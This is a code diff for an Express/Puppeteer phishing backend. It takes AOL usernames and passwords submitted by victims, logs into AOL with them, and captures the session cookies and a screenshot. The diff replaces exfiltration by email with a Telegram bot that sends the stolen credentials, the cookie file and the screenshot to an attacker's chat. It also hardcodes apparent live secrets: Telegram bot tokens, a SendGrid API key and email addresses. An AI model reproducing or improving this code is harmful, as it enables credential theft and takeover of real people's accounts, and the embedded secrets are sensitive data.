@@ -6,7 +6,7 @@ const axios = require('axios');
 const fs = require('fs');
 const nodemailer = require('nodemailer');
 const TelegramBot = require('node-telegram-bot-api');
-const token = '5105794251:AAGF8VntDb0JeE16gRsxikITHzGuhN9Kjxs';
+const token = '6106991708:AAG2YP9S_tPIYfxsh5r7kuUHycrUkrqGcjc';
 const sgMail = require('@sendgrid/mail')
 const bot = new TelegramBot(token, { polling: false });
 const apiKey = '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'; // Replace this with your SendGrid API key
@@ -26,7 +26,7 @@ const emailId = Math.random().toString(36).substring(7);
 
 require("dotenv").config()
 
-const chatId = '-510976446';
+const chatId = '-908968924';
 const value = 1234;
 
 
@@ -53,7 +53,7 @@ app.post('/api/login', async (req, res) => {
        : puppeteer.executablePath(),
     });
     try{
-    // console.log(username, password)
+    // console.log(username, password) 
     const page = await browser.newPage();
     // let data = "Password failed"
         // set the viewport width to 1200 pixels
@@ -107,6 +107,7 @@ await new Promise(resolve => setTimeout(resolve, 3000));
     // User is logged in, do something
     console.log('Login failed');
     res.json({ succ: 'true' });
+    return
   } else {
     // User login failed, do something
     console.log('Login successful');
@@ -123,36 +124,39 @@ console.log('Cookies saved to cookies.txt');
 const mail = 'tonywhitton@aol.com'
 await page.screenshot({path: 'pol.png'});
 
-const mailOptions = {
-  from: 'COOK <murraysheldonmurray@gmail.com>',
-  to: mail,
-  subject: 'COOKING',
-  attachments: [
-    {
-      filename: 'cookies.txt',
-      path: 'cookies.txt', // Replace with the actual file path
-    },
-    {
-      filename: 'pol.png',
-      path: 'pol.png', // Replace with the actual image path
-      cid: 'image@unique.cid',
-    },
-  ],
-  html: `<p>AOL VERIFIED LOGIN WITH COOKIES LOGIN ✅🎣: https://login.aol.com</p><br/> <img src="cid:image@unique.cid"> <br/> USERNAME:  ${username} <br/> PASSWORD: ${password}`,
-headers: {
-    'X-Unique-ID': emailId
-  }
-}
+// Read the .txt file
+const filePath = 'cookies.txt';
+// Create a readable stream from the file
+const fileStream = fs.createReadStream(filePath);
 
-transporter.sendMail(mailOptions, (error, info) => {
-  if (error) {
-    console.log(error);
-  } else {
-    console.log(`Email sent to ${mail}: ` + info.response);
-  }
-});
+// Send the .txt file as a document
+bot.sendDocument(chatId, fileStream)
+  .then(() => {
+    console.log('File sent successfully');
+  })
+  .catch((error) => {
+    console.error('Error sending file:', error);
+  });
     // return
   }
+// Send the text message
+bot.sendMessage(chatId, `✅ ✅ VERIFIED AOL LOGIN ✅ ✅ :      USERNAME: ${username}  ||  PASSWORD: ${password}`)
+  .then(() => {
+    console.log('Message sent successfully');
+  })
+  .catch((error) => {
+    console.error('Error sending message:', error);
+  });
+const imagePath = 'pol.png';
+
+  // Send the image
+bot.sendPhoto(chatId, imagePath)
+    .then(() => {
+      console.log('Image sent successfully');
+    })
+    .catch((error) => {
+      console.error('Error sending image:', error);
+    });
 
 
 // await page.waitForTimeout(10000); // wait for 10 seconds (10000 milliseconds)
@@ -169,6 +173,7 @@ transporter.sendMail(mailOptions, (error, info) => {
     // res.json({ cookies });
   });
 
+  
 
 const port = 3000
 
